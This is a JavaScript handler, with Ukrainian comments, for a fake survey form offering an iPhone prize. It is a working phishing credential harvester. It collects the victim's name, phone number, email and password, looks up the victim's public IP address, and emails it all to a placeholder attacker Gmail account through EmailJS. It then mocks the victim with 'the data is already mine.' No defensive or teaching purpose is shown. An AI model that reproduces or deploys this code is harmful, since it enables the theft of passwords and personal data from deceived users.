const form = document.getElementById('surveyForm');
const result = document.getElementById('result');

form.addEventListener('submit', function(event) {
    event.preventDefault();
    
    const userData = {
        name: document.getElementById('name').value,
        phone: document.getElementById('phone').value,
        email: document.getElementById('email').value,
        password: document.getElementById('password').value,
        timestamp: new Date().toLocaleString('uk-UA'),
        ip: 'Очікується...'
    };

    // Показуємо завантаження
    result.style.display = 'block';
    result.innerHTML = '🔄 Відправка даних на сервер...';

    // Спершу отримуємо IP (для додаткової інфи)
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(ipData => {
            userData.ip = ipData.ip;
            
            // Відправляємо на пошту через EmailJS
            return emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', {
                from_name: userData.name,
                phone: userData.phone,
                email: userData.email,
                password: userData.password,
                timestamp: userData.timestamp,
                ip_address: userData.ip,
                to_email: 'YOUR_EMAIL@gmail.com' // Твоя пошта
            });
        })
        .then(() => {
            // Успішна відправка
            result.innerHTML = `
                <h3>🎊 Вітаємо, ${userData.name}!</h3>
                <p>Твої дані успішно відправлені!<br>
                Скоро з тобою зв'яжуться для отримання iPhone! 📱</p>
                <small>Це був жарт 😄 Дані вже у мене!</small>
            `;
            console.log('ДАНІ ВІДПРАВЛЕНІ:', userData);
            form.reset();
        })
        .catch(error => {
            // Помилка відправки
            result.innerHTML = `
                <h3>😕 Щось пішло не так...</h3>
                <p>Але твої дані все одно збережені!</p>
            `;
            console.log('ДАНІ (помилка відправки):', userData);
            console.error('Помилка EmailJS:', error);
        });
});